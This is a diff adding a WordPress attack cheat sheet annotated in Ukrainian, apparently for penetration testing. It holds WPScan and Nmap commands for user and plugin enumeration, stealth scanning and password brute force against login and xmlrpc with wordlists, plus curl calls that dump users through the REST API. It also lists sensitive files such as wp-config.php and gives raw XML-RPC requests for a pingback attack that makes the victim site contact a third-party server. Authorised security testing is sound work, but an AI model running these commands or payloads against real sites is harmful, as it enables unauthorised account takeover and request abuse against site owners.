@@ -1,0 +1,110 @@
+@@@@@@@@@@@@@@@@@@@@@@@@@@
+WPSCAN COMMANS
+@@@@@@@@@@@@@@@@@@@@@@@@@@
+wpscan --url https://example.com --enumerate u,ap,vt,tt,cb,dbe,m --random-user-agent --api-token TOKEN — комплексне сканування з режимом випадкового User-Agent браузера та енумерацією користувачів (u), плагінів (ap), тем (vt), timthumbs (tt), файлів конфігурації бекапів (cb), дампів баз даних (dbe), медіафайлів (m);
+wpscan --url http://example.com --enumerate u,ap,vt,tt,cb,dbe,m --random-user-agent | tee wpscan_log.txt --api-token TOKEN — комплексне сканування зі збереженням результатів виводу у файл;
+wpscan --stealthy --url https://example.com --api-token TOKEN — режим прихованого сканування;
+wpscan --url https://example.com --enumerate u --random-user-agent --api-token TOKEN — енумерація імен користувачів WordPress;
+wpscan --url http://example.com -e u --passwords /path/to/password_file.txt — енумерація імен користувачів і брутфорс атака на них з підбором паролів, використовуючи словник;
+wpscan --url https://example.com --passwords ~/passwords.txt --usernames administrator --max-threads 50 --api-token TOKEN — брутфорс атака на користувачів WordPress;
+wpscan --url https://example.com/ -U user.txt -P /usr/share/wordlists/rockyou.txt --api-token TOKEN — брутфорс атака на облікові записи користувачів WordPress, використовуючи список імен користувачів та паролів;
+wpscan --password-attack xmlrpc -t 20 -U admin, admin2 -P passwords.txt --url https://example.com --api-token TOKEN — брутфорс атака підбору паролів націлена на заданих користувачів з застосуванням методу входу через xmlrpc;
+wpscan --url https://example.com --enumerate p --random-user-agent — енумерація плагінів WordPress;
+wpscan --url https://example.com --plugins-detected agressive --random-user-agent --api-token TOKEN — агресивна енумерація плагінів WordPress;
+wpscan --url https://example.com --max-threads 1 --throttle 3000 -f cli-no-color --proxy socks5://127.0.0.1:8085 --api-token TOKEN — сканування по одному потоку, затримка між кожним запитом буде 3 секунди, виведення результатів буде в текстовому форматі без кольорових елементів, усі запити проходитимуть через проксі-сервер SOCKS5;
+wpscan --url https://example.com --disable-tls-checks --api-token TOKEN — сканування без перевірки SSL/TLS;
+wpscan --url https://example.com/ --http-auth user:pass --api-token TOKEN — сканування сайту з увімкненою HTTP-преавторизацією, вказавши дані входу;
+wpscan --url http://example.com --force --api-token TOKEN — сканування сайту у примусовому режимі, навіть якщо WPScan не може визначити, що сайт працює на WordPress;
+wpscan --url http://example.com --wp-content-dir /custom-content/ --api-token TOKEN — сканування вказаної директорії WordPress, якщо вона відрізняється від стандартної.
+
+@@@@@@@@@@@@@@@@@@@@@@
+NMAP
+@@@@@@@@@@@@@@@@@@@@@@
+nmap -sV --script http-wordpress-enum example.com
+nmap -sV --script http-wordpress-users example.com
+nmap -p80 --script http-wordpress-brute --script-args 'userdb=users.txt,passdb=passwords.txt' example.com
+
+@@@@@@@@@@@@@@@@@@@@@@
+CURL
+@@@@@@@@@@@@@@@@@@@@@@
+curl https://example.com/wp-json/wp/v2/users | jq
+curl https://example.com/wp-json/wp/v2/posts | jq
+curl https://example.com/wp-json/wp/v2/tags | jq
+curl https://example.com/wp-json/wp/v2/comments | jq
+curl https://example.com/wp-json/wp/v2/categories | jq
+
+curl -s -X GET https://example.com/wp-includes/ | html2text - аналіз лістингу директорій у командному рядку
+
+@@@@@@@@@@@@@@@@@@@@@@
+FILES 
+@@@@@@@@@@@@@@@@@@@@@@
+/wp-config.php
+/wp-login.php
+/xmlrpc.php
+/wp-trackback.php
+/readme.html
+/wp-config-sample.php
+/wp-links-opml.php
+/wp-signup.php
+/wp-mail.php
+/wp-content/debug.log
+/wp-admin/load-scripts.php
+/wp-admin/load-styles.php
+/wp-admin/setup-config.php
+/wp-admin/install.php
+/wp-settings.php
+/wp-includes/
+/wp-content/uploads/
+
+@@@@@@@@@@@@@@@@@@@@@@
+XML-RPC EXPLOITATION
+@@@@@@@@@@@@@@@@@@@@@@
+Відправляє пост-запит:
+POST /xmlrpc.php HTTP/1.1
+Host: example.com
+Content-Length: 135
+
+<?xml version="1.0" encoding="utf-8"?>
+<methodCall>
+<methodName>system.listMethods</methodName>
+<params></params>
+</methodCall>
+
+Сервер успішно приймає і у відповідь надає перелік публічнодоступних функцій XML-RPС, до яких можна стукати. Серед них pingback.ping – це функція WordPress, яка сповіщає інші сайти через HTTP-запити про нові публікації.
+
+Проводимо пінгбек-атаку, виконуємо запит до стороннього сервера від імені WordPress жертви:
+
+POST /xmlrpc.php HTTP/1.1
+Host: example.com
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63
+Safari/537.36
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/avi
+f,image/webp,image/apng,*/*;q=0.8,application/signed-
+exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: _XXXXXX
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 336
+<methodCall>
+<methodName>pingback.ping</methodName>
+<params>
+<param><value><string>https://target-site/post</string></value>
+</param>
+<param><value><string>[domain]/?p=1</string></value></param>
+</params>
+</methodCall>
+
+У лог стороннього сайту у логах буде:
+
+XX.XX.XXX.XXX - - [20/Jul/2023:14:10:42 +0000] "GET /post/
+HTTP/2" 200 12704 "https://target-site/post/" "WordPress/5.7.2;
+http://[domain]; verifying pingback from XX.XXX.XX.XX" "target-
+site"
+
+Таким чином можна маніпуляти цим.
+
